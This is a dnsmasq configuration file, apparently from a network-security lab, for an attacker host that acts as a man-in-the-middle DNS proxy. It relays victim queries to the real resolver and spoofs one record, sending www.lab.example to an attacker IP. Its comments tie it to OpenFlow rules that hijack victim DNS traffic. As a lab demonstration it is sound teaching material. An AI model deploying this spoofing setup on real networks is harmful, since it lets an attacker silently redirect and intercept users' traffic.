# Attacker's DNS PROXY  ==  the man-in-the-middle resolver.
# Runs on the ATTACKER host h3 (10.0.10.13).
#
# This is what makes the attack a true man-in-the-middle instead of a redirect.
# A *rogue* resolver would invent every answer and the real DNS server would
# never be contacted. This PROXY instead FORWARDS every query to the REAL
# resolver (srv 10.0.30.10), reads the genuine reply, and relays it back to the
# victim -- so the real server still participates and neither side notices the
# attacker in the middle. For demonstration it also ALTERS one chosen record
# in flight, to show the attacker can both read and modify the traffic.
#
# The OpenFlow flows (push_dns_hijack.py) steer the victim's UDP/53 to this host
# and re-source the reply as 10.0.30.10, so the victim sees a normal answer.

no-hosts
no-resolv                     # ignore /etc/resolv.conf ...
server=10.0.30.10             # ... and forward EVERY query to the real resolver (srv)

listen-address=127.0.0.1,10.0.10.13
bind-interfaces
port=53

# --- In-flight tamper (proves the attacker alters responses) ---
# Only this one name is answered locally with the attacker's IP. Every other
# name (e.g. intranet.lab.example) is relayed untouched from the real server,
# which proves the real server is still in the loop.
address=/www.lab.example/10.6.6.66

# Log every query so the relay + tamper is visible in the attacker's log.
log-queries
log-facility=/tmp/h3_dns.log
